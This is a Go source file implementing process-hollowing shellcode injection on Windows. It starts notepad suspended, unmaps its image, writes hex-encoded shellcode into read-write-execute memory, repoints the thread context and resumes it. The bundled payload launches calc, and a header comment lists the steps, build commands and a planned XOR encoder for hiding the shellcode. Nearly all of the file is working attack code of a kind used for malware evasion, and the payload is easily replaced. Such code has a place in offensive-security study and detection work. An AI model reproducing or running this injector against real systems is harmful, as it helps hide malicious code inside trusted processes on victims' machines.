/*
	@saulpanders
	Process hollowing shellcode injection technique

	currently pops shellcode for calc


	METHOD:

			1. Start new process in suspended state by calling CreateProcess w/ CREATE_SUSPENDED (0x4)
			2. Unmap memory allocated for proc w/ NtUnmapViewOfSection
			3. Allocate space in memory for payload using VirtualAllocEx
			4. Inject payload into memory at allocated region w/ WriteProcessMemory
			5. Change execution point of target process to start on payload w/ GetThreadContext
			6. Resume target process execution by calling ResumeThread


	TODO:

		XOR encoder for shellcode
		Refactor code to "functions"

	BUILD:

		go build processhollowing.go -o goProcessHollowing.exe

		I like to use notepad to test

		working 32-bit PoC!!! (key was to use 32bit compatible shellcode --- duuuhhh)


	inspired by https://www.deepinstinct.com/2019/09/15/malware-evasion-techniques-part-1-process-injection-and-manipulation/

	calc shellcode generated from:

	https://github.com/peterferrie/win-exec-calc-shellcode

	for help with generating the calc string from a compiled .bin (powershell)
	$hexString = ($(Format-Hex -Path .\build\bin\win-exec-calc-shellcode.bin).bytes |ForEach-Object ToString X2) -join ''

*/

package main

import (
	"encoding/hex"
	"flag"
	"fmt"
	"log"
	"syscall"
	"unsafe"

	// Sub Repositories
	"golang.org/x/sys/windows"
)

const (
	CREATE_SUSPENDED = 0x00000004

	PROCESS_CREATE_THREAD     = 0x0080
	PROCESS_QUERY_INFORMATION = 0x0400
	PROCESS_VM_OPERATION      = 0x0008
	PROCESS_VM_READ           = 0x0010
	PROCESS_VM_WRITE          = 0x0020

	CREATE_THREAD_ACCESS = (PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ)

	MEM_COMMIT  = 0x00001000
	MEM_RESERVE = 0x00002000

	MEM_PERMISSIONS = (MEM_COMMIT | MEM_RESERVE)

	PAGE_READWRITE          = 0x04
	PAGE_EXECUTE_READ       = 0x20
	PAGE_READ_WRITE_EXECUTE = 0x40

	CREATE_NO_WINDOW = 0x08000000

	THREAD_SET_CONTEXT = 0x0010

	CONTEXT_i386    = 0x10000
	CONTEXT_INTEGER = (CONTEXT_i386 | 0x02)
)

type FLOATING_SAVE_AREA struct {
	ControlWord   uint32
	StatusWord    uint32
	TagWord       uint32
	ErrorOffset   uint32
	ErrorSelector uint32
	DataOffset    uint32
	DataSelector  uint32
	RegisterArea  [80]byte
	Cr0NpxState   uint32
}

type CONTEXT struct {
	//retrieved by CONTEXT_DEBUG_REGISTER
	ContextFlags uint32
	Dr0          uint32
	Dr1          uint32
	Dr2          uint32
	Dr3          uint32
	Dr6          uint32
	Dr7          uint32
	//retrieved by CONTEXT_FLOATING_POINT
	FloatSave FLOATING_SAVE_AREA
	//retrieved by CONTEXT_SEGMENTS
	segGs uint32
	segFs uint32
	segEs uint32
	segDs uint32
	//retrieved by CONTEXT_INTEGER
	Edi uint32
	Esi uint32
	Ebx uint32
	Edx uint32
	Ecx uint32
	Eax uint32
	//retrieved by CONTEXT_CONTROL
	Ebp    uint32
	Eip    uint32
	SegCs  uint32
	EFlags uint32
	Esp    uint32
	SegSs  uint32
	//retrieved by CONTEXT_EXTENDED REGISTERS
	ExtendedRegisters [512]byte
}

func main() {

	//ARGS

	verbose := flag.Bool("verbose", false, "Enable verbose output")
	flag.Parse()

	//Pop Calc Shellcode - SOLID SHELLCODE POC - uses 32 bit shellcode PoC ;)

	shellcode, errShellcode := hex.DecodeString("31C0506863616C635459504092741551648B722F8B760C8B760CAD8B308B7E18B250EB1AB2604829D465488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD7")
	if errShellcode != nil {
		log.Fatal(fmt.Sprintf("[!]there was an error decoding the string to a hex byte array: %s", errShellcode.Error()))
	}

	//import libraries
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")

	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	GetThreadContext := kernel32.NewProc("GetThreadContext")
	SetThreadContext := kernel32.NewProc("SetThreadContext")
	//ResumeThread := kernel32.NewProc("ResumeThread")

	NtUnmapViewOfSection := ntdll.NewProc("NtUnmapViewOfSection")

	var si windows.StartupInfo
	var pi windows.ProcessInformation
	var psec windows.SecurityAttributes
	var tsec windows.SecurityAttributes

	//create suspended process - CreateProcess (sysWOW63 == 32 bit version of notepad)
	argv := syscall.StringToUTF16Ptr("C:\\WINDOWS\\sysWOW64\\notepad.exe")
	errCreateProcess := windows.CreateProcess(argv, nil, &psec, &tsec, false, CREATE_SUSPENDED, nil, nil, &si, &pi)

	if errCreateProcess != nil {
		log.Fatal(fmt.Sprintf("[!]Error calling CreateProcess:\r\n%s", errCreateProcess.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully created a process with PID: %d", pi.ProcessId))
	}

	//unmapping memory - NtUnmapViewOfSection
	_, _, errNtUnmapViewOfSection := NtUnmapViewOfSection.Call(uintptr(pi.Process))

	if errNtUnmapViewOfSection != nil && errNtUnmapViewOfSection.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling NtUnmapViewOfSection:\r\n%s", errNtUnmapViewOfSection.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully unmapped memory in %d", pi.ProcessId))

	}

	//Allocating memory in process - VirtualAllocEx
	addr, _, errVirtualAllocEx := VirtualAllocEx.Call(uintptr(pi.Process), 0, uintptr(len(shellcode)), MEM_PERMISSIONS, PAGE_READ_WRITE_EXECUTE)

	if errVirtualAllocEx != nil && errVirtualAllocEx.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAllocEx:\r\n%s", errVirtualAllocEx.Error()))
	}

	if addr == 0 {
		log.Fatal("[!]VirtualAllocEx failed and returned 0")
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully allocated memory in PID %d", pi.ProcessId))
	}

	//Writing shellcode into allocated memory - WriteProcessMemory
	_, _, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(pi.Process), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	if errWriteProcessMemory != nil && errWriteProcessMemory.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling WriteProcessMemory:\r\n%s", errWriteProcessMemory.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully wrote shellcode to PID %d", pi.ProcessId))

	}

	//using self-defined contxt data struct
	var cntx CONTEXT
	cntx.ContextFlags = CONTEXT_INTEGER

	//getting current thread context (to resume) GetThreadContext
	_, _, errGetThreadContext := GetThreadContext.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(&cntx)))

	if errGetThreadContext != nil && errGetThreadContext.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling GetThreadContext:\r\n%s", errGetThreadContext.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully got thread context  %d in %d", pi.Thread, pi.ProcessId))

	}

	//set thread context (EAX) to point to shellcode in memory
	cntx.Eax = uint32(addr)

	_, _, errSetThreadContext := SetThreadContext.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(&cntx)))
	if errSetThreadContext != nil && errSetThreadContext.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling SetThreadContext:\r\n%s", errSetThreadContext.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully set thread for %d in  %d", pi.Thread, pi.ProcessId))

	}

	//resuming thread
	_, errResumeThread := windows.ResumeThread(pi.Thread)
	if errResumeThread != nil {
		log.Fatal(fmt.Sprintf("[!]Error calling ResumeThread:\r\n%s", errResumeThread.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully resumed thread %d in %d", pi.Thread, pi.ProcessId))
	}

}
